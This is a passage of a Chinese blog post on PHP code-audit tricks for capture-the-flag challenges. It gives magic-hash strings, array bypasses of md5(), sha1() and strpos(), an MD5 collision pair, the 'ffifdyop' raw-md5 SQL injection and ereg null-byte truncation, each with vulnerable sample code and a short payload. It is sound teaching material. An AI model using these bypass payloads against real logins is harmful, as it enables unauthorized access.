+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">240610708:0e462097431906509019562988736854<br>QLTHNDT:0e405967825401955372549139051580<br>QNKCDZO:0e830400451993494058024219903391<br>PJNPDWY:0e291529052894702774557631701704<br>NWWKITQ:0e763082070976038347657360817689<br>NOOPCJF:0e818888003657176127862245791911<br>MMHUWUV:0e701732711630150438129209816536<br>MAUXXQC:0e478478466848439040434801845361<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$flag</span>);    <span class="hljs-comment">//可以使用数组绕过 也可以使用科学计数法绕过</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>因为是if的判断条件是两个数弱类型相等，就可以利用hash比较缺陷去绕过</p>
+</blockquote>
+<ol start="2">
+<li><p>md5强类型比较</p>
+<p>数组绕过</p>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;&lt;!-- --&gt;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$flag</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?a[]=<span class="hljs-number">1</span>&amp;b[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>此时两个md5后的值采用严格比较，没有规定字符串如果这个时候传入的是数组不是字符串，可以利用md5()函数的缺陷进行绕过<br>md5()函数的描述是string md5(string $str[,bool $raw_output&#x3D;false])</p>
+<p>md5中需要的是一个string参数，但是当你传入一个array(数组)是，md5()是不会报错的，只是无法求出array的md5的值，这样就会导致任意的2个array的md5的值都会相等</p>
+</blockquote>
+<ol start="3">
+<li>md5碰撞</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;success!);</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在强类型比较的基础上，把比较类型的转成字符串，这样数组绕过就不能用了，这里可以通过md5碰撞去生成两个字符串内容不同，md5相同的文件。<br>真实md5碰撞，因为此时不能输入数组了，只能输入字符串</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a=M%C9h%FF%<span class="hljs-number">0</span>E%E3%<span class="hljs-number">5</span>C%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>r%D4w%<span class="hljs-number">7</span>Br%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%D3o%A7%B2%<span class="hljs-number">1</span>B%DCV%B7J%<span class="hljs-number">3</span>D%C0x%<span class="hljs-number">3</span>E%<span class="hljs-number">7</span>B%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%AF%BF%A2%<span class="hljs-number">00</span>%A8%<span class="hljs-number">28</span>K%F3n%<span class="hljs-number">8</span>EKU%B3_Bu%<span class="hljs-number">93</span>%D8Igm%A0%D1U%<span class="hljs-number">5</span>D%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%FB_%<span class="hljs-number">07</span>%FE%A2&amp;b=M%C9h%FF%<span class="hljs-number">0</span>E%E3%<span class="hljs-number">5</span>C%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>r%D4w%<span class="hljs-number">7</span>Br%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%D3o%A7%B2%<span class="hljs-number">1</span>B%DCV%B7J%<span class="hljs-number">3</span>D%C0x%<span class="hljs-number">3</span>E%<span class="hljs-number">7</span>B%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%AF%BF%A2%<span class="hljs-number">02</span>%A8%<span class="hljs-number">28</span>K%F3n%<span class="hljs-number">8</span>EKU%B3_Bu%<span class="hljs-number">93</span>%D8Igm%A0%D1%D5%<span class="hljs-number">5</span>D%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%FB_%<span class="hljs-number">07</span>%FE%A2<br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>特殊情况</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!-- <span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>	<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>	<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$link</span>,<span class="hljs-variable">$sql</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag is :&#x27;</span>.<span class="hljs-variable">$flag</span>;<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;密码错误!&#x27;</span>;<br>		&#125; --&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-keyword">string</span>,raw)<br>参数	描述<br><span class="hljs-keyword">string</span>	必需。规定要计算的字符串。<br>raw	可选。规定十六进制或二进制输出格式：<br><br>         <span class="hljs-literal">TRUE</span> - 原始 <span class="hljs-number">16</span> 字符二进制格式<br>          <span class="hljs-literal">FALSE</span> - 默认。<span class="hljs-number">32</span> 字符十六进制数<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>当md5函数的第二个参数为true时，该函数的输出是原始二进制格式，会被作为字符串处理。<br>理解这一点后，问题就简单了。<br>只要提交特定字符串，让其md5值以原始二进制格式输出（被当作字符串）时含有能触发SQL注入的特殊字符即可。</p>
+</blockquote>
+<p>如何找到这样的字符串呢？百度一番后我找到了两个：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">content: 129581926211651571912466741651878684928<br>hex: 06da5430449f8f6f23dfc1276f722738<br>raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#x27;or&#x27;8<br>string: T0Do#&#x27;or&#x27;8<br><br>content: ffifdyop<br>hex: 276f722736c95d99e921722cf9ed621c<br>raw: &#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c<br>string: &#x27;or&#x27;6]!r,b<br></code></pre></td></tr></table></figure>
+
+<h4 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h4><blockquote>
+<p>同md5()一样，sha1()函数也无法处理数组，因此可以构造数组绕过。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>] == <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])<br><br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;passwd can not be uname.&#x27;</span>;<br><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])&amp;(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]==<span class="hljs-string">&#x27;margin&#x27;</span>))<br><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br><br>    <span class="hljs-keyword">else</span><br><br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;sorry!&#x27;</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>	&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;<br>	&#125;<br>	<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">9999999</span>)<br>	&#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;*-*&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br>		&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span><br>		&#123;<br>			<span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>);<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>%00截断：ereg函数 读到 %00 的时候，就截止了。</strong></p>
+<p>长度小于8大小大于99999999，可以用科学计数法来绕过，构造10的7次方 10000000&gt;9999999</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?password=1e7%00*-*<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[1-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;必须输入数字才行&#x27;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>], <span class="hljs-string">&#x27;#biubiubiu&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;骚年，继续努力吧啊~&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>构造数组绕过，并且值含有数字。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">payload:?ctf[]=1<br></code></pre></td></tr></table></figure>
+</blockquote>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP反序列化</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/03/NCTF2019True-XML-cookbook/">
+                        <span class="hidden-mobile">NCTF2019True XML cookbook</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?17691437";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
